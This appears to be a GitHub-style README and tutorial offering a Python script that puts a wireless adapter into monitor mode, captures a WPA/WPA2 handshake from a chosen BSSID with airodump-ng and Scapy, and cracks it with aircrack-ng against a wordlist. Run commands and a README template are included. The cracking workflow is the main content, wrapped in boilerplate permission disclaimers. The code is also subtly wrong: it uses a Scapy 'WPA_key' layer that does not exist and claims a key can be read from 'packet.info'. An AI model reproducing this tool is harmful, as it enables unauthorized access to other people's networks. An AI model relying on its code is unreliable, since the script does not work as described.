# wireless-network-penetration-testing

Performing penetration testing on wireless networks, including cracking WEP or WPA/WPA2 keys, involves using specialized tools and libraries like Scapy for packet manipulation and capturing. Below, I'll outline a basic Python script that utilizes Scapy to perform wireless network penetration testing. Note that penetration testing should only be performed on networks you own or have explicit permission to test.

Prerequisites

1. Install Scapy:
pip install scapy
Ensure your wireless network adapter supports monitor mode.

2. Python Script for Penetration Testing with Scapy


import os
import sys
import time
import argparse
from scapy.all import *

# Function to handle sniffed packets
def handle_packet(packet):
    if packet.haslayer(WPA_key):
        print("[+] WPA key found!")
        print(f"    MAC Address: {packet.addr2}")
        print(f"    WPA Key: {packet.info.decode()}")

# Function to perform WPA/WPA2 key cracking
def crack_wpa_key(interface, bssid, wordlist):
    print("[*] Starting WPA/WPA2 key cracking...")
    cmd = f"airmon-ng start {interface}"
    os.system(cmd)

    time.sleep(2)  # Wait for interface to enter monitor mode

    cmd = f"airodump-ng {interface} --bssid {bssid} -w capture"
    os.system(cmd)

    time.sleep(5)  # Capture some packets

    # Sniff for handshake packets
    sniff(prn=handle_packet, timeout=60)

    # Crack the captured handshake using aircrack-ng
    cmd = f"aircrack-ng -w {wordlist} capture-01.cap"
    os.system(cmd)

    cmd = f"airmon-ng stop {interface}"
    os.system(cmd)

# Main function
def main():
    parser = argparse.ArgumentParser(description="Wireless Network Penetration Testing Script")
    parser.add_argument("-i", "--interface", type=str, required=True, help="Wireless interface (e.g., wlan0)")
    parser.add_argument("-b", "--bssid", type=str, required=True, help="BSSID of the target network")
    parser.add_argument("-w", "--wordlist", type=str, required=True, help="Path to the wordlist file for key cracking")
    args = parser.parse_args()

    print("[*] Starting wireless penetration testing...")
    crack_wpa_key(args.interface, args.bssid, args.wordlist)
    print("[*] Penetration testing complete.")

if __name__ == "__main__":
    main()
    
Usage

Save the script as wifi_penetration_test.py and run it from the command line with appropriate arguments:
python wifi_penetration_test.py -i wlan0 -b <BSSID> -w <wordlist.txt>
Replace <BSSID> with the BSSID (MAC address) of the target wireless network and <wordlist.txt> with the path to a wordlist file containing potential passwords for key cracking.

Notes
  * Monitor Mode: Ensure your wireless interface (wlan0 in this example) supports monitor mode for sniffing and injecting packets. You may need to use tools like airmon-ng to enable monitor mode.
  * Legal Considerations: Penetration testing should only be conducted on networks you have permission to test. Unauthorized testing is illegal and unethical.
  * Wordlist: Use a comprehensive wordlist (e.g., rockyou.txt) for key cracking. You can find various wordlists online.
  * Performance: Key cracking can be time-consuming and resource-intensive depending on the strength of the target network's password.

Creating a README.md file is essential for documenting your wireless network penetration testing script. Below is a template for a README.md file tailored for your Python script using Scapy for performing penetration testing on wireless networks.

Wireless Network Penetration Testing Script
This Python script utilizes Scapy to perform penetration testing on wireless networks, including cracking WPA/WPA2 keys. Please use this script responsibly and only on networks you have explicit permission to test.

Prerequisites
  * Python 3.x installed on your machine
  * Scapy library installed (pip install scapy)
  * Wireless network adapter that supports monitor mode

Usage
1. Clone the repository:
git clone https://github.com/your_username/wireless-penetration-testing.git

2. Navigate to the project directory:
cd wireless-penetration-testing

3. Run the script with the following command:
python wifi_penetration_test.py -i <interface> -b <BSSID> -w <wordlist.txt>

Replace <interface> with your wireless interface name (e.g., wlan0), <BSSID> with the BSSID (MAC address) of the target network, and <wordlist.txt> with the path to a wordlist file containing potential passwords for key cracking.

Script Details
  * wifi_penetration_test.py: Main Python script for wireless network penetration testing.
  * Dependencies: Uses Scapy for packet manipulation and capturing.
  * Functions:
      * crack_wpa_key(interface, bssid, wordlist): Initiates WPA/WPA2 key cracking using airmon-ng and aircrack-ng.
      * handle_packet(packet): Handles sniffed packets to detect WPA key information.

Important Notes
  * Legal Compliance: Ensure you have proper authorization before conducting penetration testing on wireless networks.
  * Monitor Mode: Your wireless network adapter must support monitor mode for packet sniffing and injection.
  * Wordlist: Use a comprehensive wordlist file for efficient key cracking (e.g., rockyou.txt).
